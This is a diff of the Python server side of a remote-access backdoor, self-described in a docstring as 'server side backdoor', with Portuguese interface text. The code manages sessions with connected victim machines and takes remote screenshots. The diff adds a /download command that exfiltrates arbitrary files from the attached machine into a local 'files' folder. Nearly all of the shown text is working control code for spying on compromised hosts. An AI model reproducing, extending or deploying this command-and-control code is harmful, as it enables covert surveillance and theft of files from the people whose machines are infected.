@@ -13,11 +13,12 @@ from rich import print as printr
 from os import system, uname
 
 class Server(object):
+    """ server side backdoor """
     def __init__(self, host='0.0.0.0', port=1234):
         self.__Address = (host, port)
         self.connectedUsers = {}
         self.userAttached = ''
-
+        
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
 
@@ -30,7 +31,7 @@ class Server(object):
                 printr(f'[red] Não há sessão ativa com [yellow]{name[0]}[red] no momento.')
         else:
             printr('Info: Abre a sessão ativa interagindo com um usuário. Ex: /attach zNairy-PC')
-    
+
     def detach(self, name):
         if self.userAttached:
             self.userAttached = ''
@@ -38,7 +39,7 @@ class Server(object):
             printr(f'[red] Você não está interagindo com nenhuma seção no momento.')
 
     def checkFolders(self):
-        for folder in ['./screenshots']:
+        for folder in ['./screenshots','files']:
             if not Path(folder).is_dir():
                 Path(folder).mkdir()
 
@@ -51,7 +52,24 @@ class Server(object):
         while len(received) < header['bytes']:
             received += connection.recv(header['bytes'])
         
-        self.saveReceivedFile(f'./screenshots/{header["namefile"]}.{header["extension"]}', received)
+        self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', received)
+
+    def download(self, args):
+        self.checkFolders()
+
+        if self.userAttached:
+            if args:
+                connection = self.connectedUsers[self.userAttached]['conn']
+                connection.send(self.lastCommand.encode())
+                header = loads(connection.recv(512))
+                if header["exists"]:
+                    self.receiveFile(connection, header)
+                else:
+                    printr('[red] Arquivo não encontrado...')
+            else:
+                printr('Info: Faz download de um arquivo externo. Ex: /download sóastop.mp3')
+        else:
+            printr('[yellow] Não há nenhuma seção aberta no momento...')
 
     def screenshot(self, args):
         self.checkFolders()
@@ -67,7 +85,7 @@ class Server(object):
 
     def addUser(self, data):
         self.connectedUsers.update({data['name']: data})
-    
+
     def removeUser(self, name):
         if name:
             if self.connectedUsers.get(name[0]):
@@ -98,14 +116,17 @@ class Server(object):
     def showCodeAuthor(self, args):
         printr(__author__)
 
-    def exit(self):
-        pass
+    def closeTerminal(self, args):
+        exit()
 
     def availableCommands(self, args):
-        print(''.join(f'  {command}\n' for command in self.allCommands().keys() ))
+        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() ))
 
+    def showLastCommand(self, args):
+        printr(self.lastCommand)
+    
     def internalcommands(self, args):
-        print(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))
+        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))
 
     def allCommands(self):
         commands = {
@@ -114,12 +135,14 @@ class Server(object):
             "/sessions": {"local": True, "action": self.showSessions},
             "/rmsession": {"local": True, "action": self.removeUser},
             "/screenshot": {"local": False, "action": self.screenshot},
+            "/download": {"local": False, "action": self.download},
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
+            "/lastcommand": {"local": True, "action": self.showLastCommand},
             "/internalcommands": {"local": True, "action": self.internalcommands},
             "/clear": {"local": True, "action": self.clearScreen},
-            "/exit": {"local": True, "action": self.exit}
+            "/exit": {"local": True, "action": self.closeTerminal}
         }
 
         commands.update({"/commands": {"local": True, "action": self.availableCommands}})
@@ -133,8 +156,9 @@ class Server(object):
         return False, command[1:]
 
     def checkCommand(self, command):
-        command, args = self.splitCommand(command.split())
+        self.lastCommand = command
 
+        command, args = self.splitCommand(command.split())
         if command:
             command['action'](args)
         else:
@@ -177,7 +201,7 @@ class Server(object):
 
     def info(self):
         return f' Servidor aberto em {self.__Address[0]}:{self.__Address[1]}'
-        
+
     def run(self):
         try:
             self.configureSocket()
